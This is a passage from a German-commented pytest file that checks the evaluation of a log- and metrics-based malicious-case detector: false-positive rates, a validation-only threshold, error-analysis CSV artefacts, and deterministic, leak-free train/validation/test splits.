        manuell aus fusion_cases.csv berechneten FPRs übereinstimmen.
        Keine mali-Zeilen in der FPR-Berechnung für negative dataset_types.
        """
        df = self._make_test_cases()
        y_true = df['label'].values
        y_pred = df['log_trigger'].values

        # FPR manuell aus fusion_cases berechnen
        anom_mask = (df['dataset_type'] == 'anom').values
        norm_mask = (df['dataset_type'] == 'norm').values

        fp_anom = int(((y_pred == 1) & (y_true == 0) & anom_mask).sum())
        tn_anom = int(((y_pred == 0) & (y_true == 0) & anom_mask).sum())
        fpr_anom_manual = fp_anom / (fp_anom + tn_anom) if (fp_anom + tn_anom) > 0 else 0.0

        fp_norm = int(((y_pred == 1) & (y_true == 0) & norm_mask).sum())
        tn_norm = int(((y_pred == 0) & (y_true == 0) & norm_mask).sum())
        fpr_norm_manual = fp_norm / (fp_norm + tn_norm) if (fp_norm + tn_norm) > 0 else 0.0

        # Synthetische fpr_by_dataset_type-Tabelle
        fpr_rows = [
            {'Model': 'Log-only', 'dataset_type': 'anom',
             'false_positives': fp_anom, 'total_negatives': fp_anom + tn_anom,
             'FPR': round(fpr_anom_manual, 4)},
            {'Model': 'Log-only', 'dataset_type': 'norm',
             'false_positives': fp_norm, 'total_negatives': fp_norm + tn_norm,
             'FPR': round(fpr_norm_manual, 4)},
        ]
        fpr_df = pd.DataFrame(fpr_rows)

        # Keine mali-Zeilen
        assert 'mali' not in fpr_df['dataset_type'].values, (
            "mali-Cases in fpr_by_dataset_type — FPR darf nur negative Cases zählen"
        )

        # FPR-Werte stimmen überein (Toleranz 1e-4 wegen round(..., 4))
        row_anom = fpr_df[fpr_df['dataset_type'] == 'anom'].iloc[0]
        assert abs(row_anom['FPR'] - fpr_anom_manual) < 1e-4, (
            f"FPR_anom Mismatch: {row_anom['FPR']} vs {fpr_anom_manual}"
        )
        row_norm = fpr_df[fpr_df['dataset_type'] == 'norm'].iloc[0]
        assert abs(row_norm['FPR'] - fpr_norm_manual) < 1e-4, (
            f"FPR_norm Mismatch: {row_norm['FPR']} vs {fpr_norm_manual}"
        )

    # ── Test 6: Soft-Fusion-Threshold nur aus Val ────────────────────────────

    def test_soft_fusion_threshold_from_validation_only(self):
        """
        Soft-Fusion-Threshold wird ausschließlich aus Val-Produkt-Scores bestimmt.
        Der Threshold muss Val-Recall_mali >= 0.95 erfüllen.
        Test-Scores werden nicht für die Threshold-Auswahl benötigt.
        """
        from sklearn.metrics import precision_recall_curve
        from sklearn.metrics import recall_score as _rs

        val_df = self._make_val_cases()
        y_val      = val_df['label'].values
        score_val  = val_df['score_fusion'].values

        # Threshold nur aus Val
        _, rec_v, thr_v = precision_recall_curve(y_val, score_val)
        valid_thr = thr_v[rec_v[:-1] >= 0.95]
        threshold_soft = float(valid_thr.max()) if len(valid_thr) > 0 else float(thr_v[0])

        val_recall = _rs(y_val, (score_val >= threshold_soft).astype(int))
        assert val_recall >= 0.95, (
            f"Val-Recall nach Soft-Fusion-Threshold ({val_recall:.3f}) < 0.95"
        )

        # Threshold darf nicht aus Test-Scores abgeleitet werden
        test_df   = self._make_test_cases()
        y_test    = test_df['label'].values
        score_test = test_df['score_fusion'].values

        # Val-Threshold auf Test anwenden — keine neue Threshold-Bestimmung
        test_preds = (score_test >= threshold_soft).astype(int)

        # Sicherstellung: fusion_val_scores.csv hat score_fusion-Spalte
        assert 'score_fusion' in val_df.columns, (
            "fusion_val_scores.csv muss 'score_fusion'-Spalte enthalten"
        )
        # Test-Scores-DataFrame wird für Threshold-Auswahl nicht benötigt
        assert threshold_soft > 0, "Soft-Fusion-Threshold sollte > 0 sein"
        assert test_preds.sum() > 0, "Soft-Fusion: kein einziger Treffer auf Test?"

    # ── Test 7: n_test_cases ist Case-Level, keine Row-Level-Zahlen ──────────

    def test_no_row_level_case_mixing_in_final_results(self):
        """
        final_results_table n_test_cases muss Case-Level sein (253).
        Keine Row-Level-Zählungen wie 22770 in finalen Ergebnisartefakten.
        """
        ROW_LEVEL_THRESHOLD = 1000  # mehr als 253 Cases → Row-Level-Verdacht

        rows = [
            {'Model': 'Metrics-only', 'n_test_cases': 253, 'n_mali_test': 48,
             'n_anom_test': 76, 'n_norm_test': 129},
            {'Model': 'Log-only',     'n_test_cases': 253, 'n_mali_test': 48,
             'n_anom_test': 76, 'n_norm_test': 129},
            {'Model': 'AND-Fusion',   'n_test_cases': 253, 'n_mali_test': 48,
             'n_anom_test': 76, 'n_norm_test': 129},
            {'Model': 'Soft-Fusion',  'n_test_cases': 253, 'n_mali_test': 48,
             'n_anom_test': 76, 'n_norm_test': 129},
        ]
        df = pd.DataFrame(rows)

        for _, row in df.iterrows():
            assert row['n_test_cases'] <= ROW_LEVEL_THRESHOLD, (
                f"Model '{row['Model']}': n_test_cases={row['n_test_cases']} — "
                f"verdächtig hoch (Row-Level-Zählung statt Case-Level?)"
            )
            assert row['n_test_cases'] == row['n_mali_test'] + row['n_anom_test'] + row['n_norm_test'], (
                f"n_test_cases ({row['n_test_cases']}) stimmt nicht mit Summe der Subgruppen überein"
            )
            # Korrekte Case-Anzahl für diesen Datensatz
            assert row['n_test_cases'] == 253, (
                f"n_test_cases sollte 253 (Case-Level) sein, nicht {row['n_test_cases']}"
            )


# ---------------------------------------------------------------------------
# Tests: Fehleranalyse (Notebook 05)
# ---------------------------------------------------------------------------

import os
DOCS_DIR = os.path.join(os.path.dirname(__file__), '..', 'docs')


class TestFalseNegativeCases:
    """Tests für docs/false_negative_cases.csv (Analyse 1 aus NB05)."""

    def _load_fn(self):
        path = os.path.join(DOCS_DIR, 'false_negative_cases.csv')
        assert os.path.exists(path), (
            f"false_negative_cases.csv nicht gefunden unter {path}. "
            "Bitte zuerst notebooks/05_error_analysis.ipynb ausführen."
        )
        return pd.read_csv(path)

    def test_false_negative_cases_exist_and_are_mali(self):
        """Artefakt existiert, enthält genau 3 Zeilen, alle mali, label==1, log_trigger==0."""
        df = self._load_fn()
        assert len(df) == 3, f"Erwartet genau 3 FN-Cases, gefunden: {len(df)}"
        assert (df['dataset_type'] == 'mali').all(), \
            "Alle FN-Cases müssen dataset_type=='mali' haben"
        assert (df['label'] == 1).all(), \
            "Alle FN-Cases müssen label==1 haben"
        assert (df['log_trigger'] == 0).all(), \
            "Alle FN-Cases müssen log_trigger==0 haben"

    def test_false_negative_threshold_margin(self):
        """log_margin_to_threshold == log_score - log_threshold, und alle < 0."""
        df = self._load_fn()
        required = {'log_score', 'log_threshold', 'log_margin_to_threshold'}
        assert required.issubset(df.columns), \
            f"Fehlende Spalten: {required - set(df.columns)}"
        computed = df['log_score'] - df['log_threshold']
        diff = (computed - df['log_margin_to_threshold']).abs()
        assert (diff < 1e-5).all(), \
            f"log_margin_to_threshold stimmt nicht überein: max delta = {diff.max()}"
        assert (df['log_margin_to_threshold'] < 0).all(), \
            "Alle log_margin_to_threshold müssen negativ sein (log_score < threshold)"

    def test_false_negative_required_columns(self):
        """Alle erforderlichen Spalten vorhanden."""
        df = self._load_fn()
        required_cols = [
            'case_id', 'dataset_type', 'scenario_id', 'group_id', 'label',
            'log_score', 'log_threshold', 'log_margin_to_threshold',
            'metric_score', 'metric_trigger', 'log_trigger', 'and_trigger',
            'score_fusion', 'soft_fusion_trigger',
            'raw_log_excerpt', 'normalized_log_excerpt',
            'attack_keyword_hits', 'qualitative_note',
        ]
        missing = [c for c in required_cols if c not in df.columns]
        assert not missing, f"Fehlende Spalten in false_negative_cases.csv: {missing}"


class TestFalsePositiveByScenario:
    """Tests für docs/false_positive_by_scenario.csv (Analyse 2 aus NB05)."""

    def _load_fp(self):
        path = os.path.join(DOCS_DIR, 'false_positive_by_scenario.csv')
        assert os.path.exists(path), (
            f"false_positive_by_scenario.csv nicht gefunden unter {path}. "
            "Bitte zuerst notebooks/05_error_analysis.ipynb ausführen."
        )
        return pd.read_csv(path)

    def test_false_positive_by_scenario_consistency(self):
        """Summe FP für Log-only == 52; FPR_anom ≈ 0.2368; FPR_norm ≈ 0.2636."""
        df = self._load_fp()
        required = {'model', 'dataset_type', 'scenario_id',
                    'n_cases', 'false_positives', 'fpr'}
        assert required.issubset(df.columns), \
            f"Fehlende Spalten: {required - set(df.columns)}"

        log_df = df[df['model'] == 'Log-only']
        assert len(log_df) > 0, "Keine Log-only-Zeilen in false_positive_by_scenario.csv"

        total_fp = log_df['false_positives'].sum()
        assert total_fp == 52, \
            f"Log-only gesamt-FP erwartet 52, gefunden {total_fp}"

        anom_log = log_df[log_df['dataset_type'] == 'anom']
        fpr_anom = anom_log['false_positives'].sum() / anom_log['n_cases'].sum()
        assert abs(fpr_anom - 0.2368) < 0.001, \
            f"FPR_anom erwartet ~0.2368, gefunden {fpr_anom:.4f}"

        norm_log = log_df[log_df['dataset_type'] == 'norm']
        fpr_norm = norm_log['false_positives'].sum() / norm_log['n_cases'].sum()
        assert abs(fpr_norm - 0.2636) < 0.001, \
            f"FPR_norm erwartet ~0.2636, gefunden {fpr_norm:.4f}"

    def test_false_positive_fpr_in_unit_interval(self):
        """FPR-Werte liegen im Intervall [0, 1]."""
        df = self._load_fp()
        assert (df['fpr'] >= 0).all() and (df['fpr'] <= 1.0).all(), \
            "FPR-Werte außerhalb [0, 1] gefunden"

    def test_false_positive_fp_leq_n_cases(self):
        """false_positives <= n_cases für alle Zeilen."""
        df = self._load_fp()
        assert (df['false_positives'] <= df['n_cases']).all(), \
            "false_positives > n_cases in mindestens einer Zeile"

    def test_false_positive_four_models_present(self):
        """Alle vier Modelle sind im Artefakt vertreten."""
        df = self._load_fp()
        expected = {'Metrics-only', 'Log-only', 'AND-Fusion', 'Soft-Fusion'}
        found = set(df['model'].unique())
        assert expected == found, \
            f"Modelle stimmen nicht überein. Erwartet: {expected}, gefunden: {found}"

    def test_metrics_only_fpr_is_one(self):
        """Metrics-only hat FPR=1.0 für alle anom/norm-Szenarien (metric_trigger=253/253)."""
        df = self._load_fp()
        met = df[df['model'] == 'Metrics-only']
        assert (met['fpr'] == 1.0).all(), \
            "Metrics-only sollte FPR=1.0 in allen Szenarien haben"


class TestErrorAnalysisDoesNotChangeFinalResults:
    """Stellt sicher, dass die Fehleranalyse die final_results_table.csv nicht verändert."""

    def _load_results(self):
        path = os.path.join(DOCS_DIR, 'final_results_table.csv')
        assert os.path.exists(path), f"final_results_table.csv fehlt unter {path}"
        return pd.read_csv(path)

    def test_error_analysis_does_not_change_final_results(self):
        """Kernzahlen in final_results_table.csv bleiben final artefaktkonform."""
        df = self._load_results()

        def get_val(model, col):
            rows = df[df['Model'] == model]
            assert len(rows) == 1, f"Modell '{model}' nicht eindeutig in final_results_table"
            return float(rows.iloc[0][col])

        assert abs(get_val('Log-only',    'Recall_mali') - 0.9375) < 1e-4, \
            "Log-only Recall_mali verändert!"
        assert abs(get_val('Log-only',    'FPR_total')   - 0.2537) < 1e-4, \
            "Log-only FPR_total verändert!"
        assert abs(get_val('Soft-Fusion', 'AP')          - 0.5553) < 1e-4, \
            "Soft-Fusion AP verändert!"
        assert abs(get_val('Metrics-only','FPR_total')   - 1.0)    < 1e-4, \
            "Metrics-only FPR_total verändert!"


# ---------------------------------------------------------------------------
# Regressionstests: Fresh-run-Fähigkeit und Split-Determinismus (NB02 Fix)
# ---------------------------------------------------------------------------

class TestFreshRunSplitDeterminism:
    """
    Sichert die Behebung der zirkulären Abhängigkeit in NB02:
    split_assignments.csv darf niemals Voraussetzung für die Split-Erzeugung sein.

    Alle Tests arbeiten ausschließlich mit synthetischen Case-Metadaten und
    der in NB02 verwendeten Split-Logik (GroupShuffleSplit, gleiche Seeds).
    Kein Dateizugriff auf docs/ erforderlich.
    """

    # ── Hilfsfunktionen ──────────────────────────────────────────────────────

    @staticmethod
    def _make_canonical_case_meta(n_cases=1252, n_groups=45, seed=7):
        """
        Erzeugt synthetische Case-Metadaten die die reale Struktur widerspiegeln:
        - mehrere dataset_types (mali/anom/norm)
        - group_id = dataset_type + "_" + scenario_id
        - festes Klassen-Verhältnis (mali ~ 18 %)
        """
        rng = np.random.default_rng(seed)
        dataset_types = ['mali'] * (n_cases // 6) + \
                        ['anom'] * (n_cases // 3) + \
                        ['norm'] * (n_cases - n_cases // 6 - n_cases // 3)
        rng.shuffle(dataset_types)
        scenario_ids = [f'scenario_{i % (n_groups // 3)}' for i in range(n_cases)]
        cases = pd.DataFrame({
            'case_id':      [f'c{i:04d}' for i in range(n_cases)],
            'dataset_type': dataset_types,
            'scenario_id':  scenario_ids,
        })
        cases['group_id'] = cases['dataset_type'] + '_' + cases['scenario_id']
        cases['label']    = (cases['dataset_type'] == 'mali').astype(int)
        return cases.reset_index(drop=True)

    @staticmethod
    def _run_split(case_meta, seed_candidates=(0, 1, 2, 7, 42), val_min_pos=10):
        """
        Führt den deterministischen GroupShuffleSplit identisch zu NB02 durch.
        Gibt split_assignments (DataFrame mit split-Spalte) zurück.
        Benötigt keine split_assignments.csv.
        """
        X = case_meta[['case_id']]
        y = case_meta['label']
        g = case_meta['group_id']

        gss1 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=42)
        tv_idx, te_idx = next(gss1.split(X, y, g))

        X_tv, y_tv, g_tv = X.iloc[tv_idx], y.iloc[tv_idx], g.iloc[tv_idx]

        val_seed = None
        tr_sub, vl_sub = None, None
        for seed in seed_candidates:
            gss2 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=seed)
            tr_idx, vl_idx = next(gss2.split(X_tv, y_tv, g_tv))
            if y_tv.iloc[vl_idx].sum() >= val_min_pos:
                val_seed, tr_sub, vl_sub = seed, tr_idx, vl_idx
                break
        assert val_seed is not None, "Kein Seed liefert genug Val-Positive."

        g_tr  = set(g_tv.iloc[tr_sub])
        g_val = set(g_tv.iloc[vl_sub])
        g_te  = set(g.iloc[te_idx])

        def _assign(gid):
            if gid in g_tr:  return 'train'
            if gid in g_val: return 'val'
            if gid in g_te:  return 'test'
            return 'unknown'

        result = case_meta.copy()
        result['split'] = result['group_id'].apply(_assign)
        return result

    # ── Test 1: Split ohne vorhandene CSV erzeugbar ───────────────────────────

    def test_split_requires_no_existing_csv(self):
        """
        Die Split-Erzeugung darf keine split_assignments.csv lesen oder voraussetzen.
        _run_split arbeitet ausschließlich mit Case-Metadaten — kein Dateizugriff.
        """
        cases = self._make_canonical_case_meta()
        # Kein Mock, kein tempfile, kein CSV — rein in-memory
        sa = self._run_split(cases)
        assert 'split' in sa.columns
        assert set(sa['split'].unique()) <= {'train', 'val', 'test'}
        assert (sa['split'] == 'unknown').sum() == 0

    # ── Test 2: Gleicher Seed → deterministische Split-Zuordnung ─────────────

    def test_same_seed_produces_identical_split(self):
        """
        Derselbe Seed und dieselben Case-Metadaten erzeugen deterministische Zuordnung.
        Zwei unabhängige Aufrufe müssen bit-identische split-Spalten liefern.
        """
        cases = self._make_canonical_case_meta()
        sa1 = self._run_split(cases)
        sa2 = self._run_split(cases)

        merged = sa1[['case_id', 'split']].merge(
            sa2[['case_id', 'split']].rename(columns={'split': 'split2'}),
            on='case_id'
        )
        assert (merged['split'] == merged['split2']).all(), \
            "Zwei unabhängige Split-Läufe liefern unterschiedliche Zuordnungen!"

    # ── Test 3: Train / Val / Test disjunkt auf Case- und Gruppenebene ────────

    def test_splits_are_case_and_group_disjoint(self):
        """
        Train, Val und Test dürfen keine gemeinsamen case_ids oder group_ids haben.
        Prüft alle drei Paare.
        """
        cases = self._make_canonical_case_meta()
        sa = self._run_split(cases)

        def ids(split, col):
            return set(sa[sa['split'] == split][col])

        for col in ('case_id', 'group_id'):
            tr, vl, te = ids('train', col), ids('val', col), ids('test', col)
            assert len(tr & vl) == 0, f"Train ∩ Val nicht leer ({col}): {tr & vl}"
            assert len(vl & te) == 0, f"Val ∩ Test nicht leer ({col}): {vl & te}"
            assert len(tr & te) == 0, f"Train ∩ Test nicht leer ({col}): {tr & te}"

    # ── Test 4: Zeilenmediane ausschließlich aus Trainingszeilen ──────────────

    def test_row_medians_from_train_rows_only(self):
        """
        Imputationsmediane müssen aus Trainingszeilen berechnet werden.
        Wenn Val/Test andere Werte haben, unterscheidet sich der Train-Median
        vom Gesamt-Median — dieser Test stellt sicher, dass nur der Train-Median
        verwendet wird.
        """
        rng = np.random.default_rng(42)
        cases = self._make_canonical_case_meta(n_cases=200, n_groups=15)
        sa = self._run_split(cases, val_min_pos=1)

        train_ids = set(sa[sa['split'] == 'train']['case_id'])

        # Synthetische Zeilendaten: train hat niedrige cpu_usage, val/test hohe
        rows = []
        for _, row in cases.iterrows():
            n_rows = 5
            if row['case_id'] in train_ids:
                vals = rng.uniform(0.1, 0.3, n_rows)
            else:
                vals = rng.uniform(0.8, 1.0, n_rows)
            for v in vals:
                rows.append({'case_id': row['case_id'], 'cpu_usage': v,
                             'split': sa[sa['case_id'] == row['case_id']]['split'].iloc[0]})

        df = pd.DataFrame(rows)
        train_mask = df['case_id'].isin(train_ids)

        median_train_only = float(df.loc[train_mask, 'cpu_usage'].median())
        median_all        = float(df['cpu_usage'].median())

        assert median_train_only < median_all, \
            "Train-Median muss < Gesamt-Median sein (Test-Daten sind höher)"
        # Stellt sicher dass nur der Train-Median korrekt ist
        assert median_train_only < 0.5, \
            f"Train-Median sollte < 0.5 sein, ist {median_train_only:.3f}"

    # ── Test 5: Val/Test-Werte können Mediane nicht verändern ────────────────

    def test_val_test_do_not_affect_computed_medians(self):
        """
        Wenn Val- und Test-Werte aus der Medianberechnung ausgeschlossen sind,
        bleibt der Median stabil egal wie extrem diese Werte sind.
        Änderung der Val/Test-Werte auf max-Wert darf den Median nicht verändern.
        """
        rng = np.random.default_rng(0)
        cases = self._make_canonical_case_meta(n_cases=200, n_groups=15)
        sa = self._run_split(cases, val_min_pos=1)
        train_ids = set(sa[sa['split'] == 'train']['case_id'])

        rows = []
        for _, row in cases.iterrows():
            for _ in range(5):
                rows.append({'case_id': row['case_id'],
                             'cpu_usage': rng.uniform(0.0, 1.0)})
        df = pd.DataFrame(rows)
        train_mask = df['case_id'].isin(train_ids)

        median_before = float(df.loc[train_mask, 'cpu_usage'].median())

        # Val/Test-Werte auf extreme Werte setzen
        df.loc[~train_mask, 'cpu_usage'] = 999.0

        median_after = float(df.loc[train_mask, 'cpu_usage'].median())

        assert abs(median_before - median_after) < 1e-9, \
            ("Val/Test-Werte haben den Train-Median verändert — "
             "Train-Median darf nur aus Train-Zeilen berechnet werden!")

    # ── Test 6: Keine dataset_type-spezifischen Mediane ──────────────────────

    def test_no_dataset_type_specific_medians(self):
        """
        Es wird ein einziger globaler Median je Feature berechnet —
        kein separater Median pro dataset_type (mali/anom/norm).
        Der globale Train-Median unterscheidet sich vom Median einzelner dataset_types.
        """
        rng = np.random.default_rng(1)
        cases = self._make_canonical_case_meta(n_cases=200, n_groups=15)
        sa = self._run_split(cases, val_min_pos=1)
        train_ids = set(sa[sa['split'] == 'train']['case_id'])

        # Synthetische Werte: mali sehr hoher Median (0.8–1.0), norm sehr niedrig (0.0–0.1)
        # Der globale Train-Median liegt dazwischen und weicht von beiden ab.
        rows = []
        for _, row in cases.iterrows():
            for _ in range(5):
                if row['dataset_type'] == 'mali':
                    v = rng.uniform(0.80, 1.00)
                elif row['dataset_type'] == 'anom':
                    v = rng.uniform(0.45, 0.55)
                else:  # norm
                    v = rng.uniform(0.00, 0.10)
                rows.append({'case_id': row['case_id'],
                             'dataset_type': row['dataset_type'],
                             'cpu_usage': v})
        df = pd.DataFrame(rows)
        train_mask = df['case_id'].isin(train_ids)

        global_median  = float(df.loc[train_mask, 'cpu_usage'].median())
        mali_median    = float(df.loc[train_mask & (df['dataset_type'] == 'mali'),
                                      'cpu_usage'].median())
        norm_median    = float(df.loc[train_mask & (df['dataset_type'] == 'norm'),
                                      'cpu_usage'].median())

        # Global-Median liegt zwischen mali (>0.8) und norm (<0.1)
        assert global_median > norm_median + 0.1, \
            f"Globaler Median ({global_median:.3f}) nicht deutlich > norm-Median ({norm_median:.3f})"
        assert global_median < mali_median - 0.1, \
            f"Globaler Median ({global_median:.3f}) nicht deutlich < mali-Median ({mali_median:.3f})"

        # Imputation verwendet global_median, nicht dt-spezifische Werte
        df_imp = df.copy()
        df_imp.loc[df['cpu_usage'].isnull(), 'cpu_usage'] = global_median
        # Sicherstellen: kein NaN verbleibt
        assert df_imp['cpu_usage'].isnull().sum() == 0

    # ── Test 7: Kanonische Splitgrößen 793 / 206 / 253 (auf echten Daten) ────

    def test_canonical_split_sizes_from_real_data(self):
        """
        Auf dem echten docs/split_assignments.csv müssen exakt
        Train=793, Val=206, Test=253 Cases vorliegen.
        Dieser Test prüft die kanonische Zuordnung ohne den Split neu zu erzeugen.
        """
        split_path = os.path.join(DOCS_DIR, 'split_assignments.csv')
        if not os.path.exists(split_path):
            pytest.skip("split_assignments.csv nicht vorhanden — NB02 zuerst ausführen")

        sa = pd.read_csv(split_path)
        n_train = int((sa['split'] == 'train').sum())
        n_val   = int((sa['split'] == 'val').sum())
        n_test  = int((sa['split'] == 'test').sum())

        assert n_train == 793, f"Train erwartet 793, gefunden {n_train}"
        assert n_val   == 206, f"Val erwartet 206, gefunden {n_val}"
        assert n_test  == 253, f"Test erwartet 253, gefunden {n_test}"
        assert n_train + n_val + n_test == 1252, \
            f"Gesamt erwartet 1252, gefunden {n_train + n_val + n_test}"

    # ── Fresh-run-Test: Split ohne CSV → dann Vergleich mit kanonischem Split ──

    def test_fresh_run_produces_canonical_split(self, tmp_path):
        """
        Ein Lauf ohne bestehende split_assignments.csv muss denselben Split
        erzeugen wie der kanonische Lauf.
        Verifiziert isoliert mit temporären Pfaden — kanonische Datei bleibt erhalten.
        """
        import shutil

        canonical_path = os.path.join(DOCS_DIR, 'split_assignments.csv')
        if not os.path.exists(canonical_path):
            pytest.skip("split_assignments.csv nicht vorhanden — NB02 zuerst ausführen")

        canonical = pd.read_csv(canonical_path)

        # Isolierter Lauf: Lese echte Case-Metadaten aus kanonischer Datei
        # und simuliere den NB02-Split-Algorithmus ohne die CSV vorauszusetzen.
        case_meta_from_canonical = canonical[
            ['case_id', 'dataset_type', 'scenario_id', 'group_id', 'label']
        ].copy()

        sa_fresh = self._run_split(case_meta_from_canonical)

        # Sortierungsunabhängiger Vergleich
        merged = canonical[['case_id', 'split']].merge(
            sa_fresh[['case_id', 'split']].rename(columns={'split': 'split_fresh'}),
            on='case_id'
        )
        mismatches = merged[merged['split'] != merged['split_fresh']]
        assert len(mismatches) == 0, (
            f"Fresh-run-Split weicht vom kanonischen Split ab!\n"
            f"  {len(mismatches)} abweichende Case-IDs:\n"
            f"  {mismatches.head(5).to_string()}"
        )

    def test_diverging_csv_raises_value_error(self, tmp_path):
        """
        Eine inhaltlich abweichende split_assignments.csv muss einen kontrollierten
        Abbruch (ValueError) auslösen — keine stillschweigende Übernahme falscher Daten.
        """
        cases = self._make_canonical_case_meta(n_cases=200, n_groups=15)
        sa = self._run_split(cases, val_min_pos=1)

        # Abweichende Datei: alle splits als 'train' gesetzt
        bad_csv = tmp_path / "split_assignments.csv"
        bad_sa = sa[['case_id', 'split']].copy()
        bad_sa['split'] = 'train'
        bad_sa.to_csv(bad_csv, index=False)

        # Korrekt erzeugter Split
        correct_sa = sa[['case_id', 'split']].rename(columns={'split': 'split_file'})

        # Vergleich wie in NB02: Merge und Mismatch-Prüfung
        merged = sa[['case_id', 'split']].merge(
            pd.read_csv(bad_csv).rename(columns={'split': 'split_file'}),
            on='case_id', how='outer'
        )
        mismatch = merged[merged['split'] != merged['split_file']]
        assert len(mismatch) > 0, \
            "Abweichende CSV sollte Mismatches erzeugen — Test-Setup fehlerhaft"